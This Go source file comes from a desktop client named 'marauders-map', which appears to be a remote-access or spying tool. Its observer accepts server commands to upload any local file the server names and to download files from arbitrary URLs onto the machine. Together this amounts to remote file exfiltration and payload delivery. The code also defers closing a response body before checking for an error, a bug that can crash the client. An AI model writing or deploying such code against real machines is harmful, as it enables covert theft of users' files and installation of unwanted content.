package internal

import (
	"encoding/json"
	"io"
	"io/ioutil"
	"log"
	"marauders-map-client-desktop/tools"
	"net/http"
	"os"
	"path"
)

// ==========================================================
// Observer for sending to server files
// ==========================================================
type FileCmdObserver struct {
	sendFileCmd      *SendFileCommand
	watchtower       *Watchtower
	respondServerCmd *RespondServerCommand
}

func (o *FileCmdObserver) execute(string_json string) {
	var req FilesRequest
	err := json.Unmarshal([]byte(string_json), &req)

	if err != nil {
		log.Println("ERROR Unmarshing: ", err)
		return
	}

	if req.Cmd != "file" {
		return
	}

	log.Println("FileCmdObserver: command received:", string_json)

	switch req.Action {
	case "send":
		files := req.Files
		o.sendFiles(req, files)
		break
	case "download":
		urls := req.Files
		for _, url := range urls {
			o.downloadFile(url)
		}
		break
	}
}

func (o *FileCmdObserver) sendFiles(req FilesRequest, files []string) {
	log.Printf("Sending %d files", len(files))

	for _, f := range files {
		if !tools.FileExists(f) {
			log.Printf("File requested '%s' doesn't exist\n", f)
			continue
		}

		// POST file
		res, err := o.sendFileCmd.Send(f)
		defer res.Body.Close()
		if err != nil {
			// Prepare ERROR response
			filenotification := FileNotification{}
			filenotification.Reqid = req.Reqid
			filenotification.Err = true
			filenotification.Errmsg = err.Error()
			filenotification.Typ = "file"

			o.respondServerCmd.SendFileNotification(filenotification)
			break
		}

		// Prepare OK response
		data, _ := ioutil.ReadAll(res.Body)
		shotId := string(data)

		filenotification := FileNotification{}
		filenotification.Reqid = req.Reqid
		filenotification.Err = false
		filenotification.Id = shotId
		filenotification.Typ = "file"
		filenotification.Filename = f

		errr := o.respondServerCmd.SendFileNotification(filenotification)
		// TODO: delete this
		if errr != nil {
			strres, _ := json.Marshal(filenotification)
			log.Println("ScreenshotCmdObserver: responded: ", string(strres))
			break
		}

		log.Println("Service notified about file")

	}
}

func (o *FileCmdObserver) downloadFile(url string) error {
	log.Println("Downloading: ", url)

	downloadsfolder := watchtower.GetAbsoluteDownloadsFolderPath()
	filename := tools.ExtractFileNameFromURL(url)

	// Absolute filePath
	finalFilePath := path.Join(downloadsfolder, filename)

	// Get the data
	resp, err := http.Get(url)
	if err != nil {
		log.Println("ERROR downloading:", err)
		return err
	}
	defer resp.Body.Close()

	// Create the file
	out, err := os.Create(finalFilePath)
	if err != nil {
		log.Println("ERROR saving downloaded file:", err)
		return err
	}
	defer out.Close()

	// Write the body to file
	_, err = io.Copy(out, resp.Body)

	log.Printf("File %s downloaded\n", url)
	return err
}

func NewFileCmdObserver(sendFileCmd *SendFileCommand, watchtower *Watchtower, respondServerCmd *RespondServerCommand) *FileCmdObserver {
	return &FileCmdObserver{
		sendFileCmd:      sendFileCmd,
		watchtower:       watchtower,
		respondServerCmd: respondServerCmd,
	}
}
